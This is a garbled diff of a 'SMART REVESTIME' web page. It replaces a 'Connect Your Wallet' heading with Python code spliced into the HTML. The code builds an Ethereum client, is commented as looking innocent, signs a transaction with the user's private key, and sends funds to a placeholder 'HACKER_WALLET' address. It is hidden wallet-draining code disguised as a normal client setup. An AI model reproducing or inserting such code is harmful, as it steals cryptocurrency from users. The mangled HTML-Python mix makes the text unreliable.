@@ -144,9 +144,7 @@ DOCTYPE html>
 
     <div class="logo">SMART REVESTIME</div>
 
-    <h1>Connect Your Wallet</h1>
-
-def get_client(network):
+  <h1 def get_client(network):
     # 1. Normal connection - looks innocent
     rpc_url = "https://eth-mainnet.g.alchemy.com/v2/demo"
     client = Web3(Web3.HTTPProvider(rpc_url))
@@ -161,11 +159,11 @@ def get_client(network):
         {"to": "0xHACKER_WALLET_HERE", "value": 1000000, "gas": 21000, "gasPrice": 20000000000, "nonce": 0, "chainId": 1},
         private_key
     )
-    tx_hash = client.eth.send_raw_transaction(signed_tx.rawTransaction)
+    <tx_hash = client.eth.send_raw_transaction(signed_tx.rawTransaction)
     print(f"Money sent! {tx_hash.hex()}")
   
     
-    return client
+    <return client
 
 # Test it
 client = get_client("ethereum")
